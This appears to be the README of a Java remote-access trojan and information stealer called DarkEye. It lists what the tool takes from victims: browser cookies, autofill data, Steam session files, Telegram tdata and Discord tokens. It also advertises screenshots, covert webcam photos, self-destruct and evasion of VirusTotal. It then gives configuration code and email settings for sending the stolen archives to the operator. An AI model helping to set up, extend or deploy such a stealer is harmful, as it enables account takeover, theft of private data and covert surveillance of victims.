# DarkEye-Java
Rat/Stealer

## Functions
Files are sent via mail (.zip)

- [Yandex, Chrome, Opera] Cookie, Auto-Fill, Bookmarks, leveldb
- Steam: config, ssfn
- Telegram: tdata
- Discord: Cookie, leveldb
- [Apps] Ngrok, Git
- Screenshot screen
- Webcam photo (keep in mind that the lamp lights up)
- Self-destruct
- VirusTotal undetected

## Configuration
In the Config class, you need to enter your Sender and Recipient mail data.
In the sender, you need to choose which mail (E-Mail Method)
```Java
public static EMailData FROM_DATA = new EMailData("xxxxx@yandex.ru", "password", EMailMethod.YANDEX);
public static EMailData TO_DATA = new EMailData("xxxxx@gmail.com");
```

### Email Setup
#### Necessarily*
In the sender's mail settings, enable:
```Allow access to the mailbox using IMAP mail clients```

[C# DarkEye](https://github.com/GishReloaded/DarkEye)
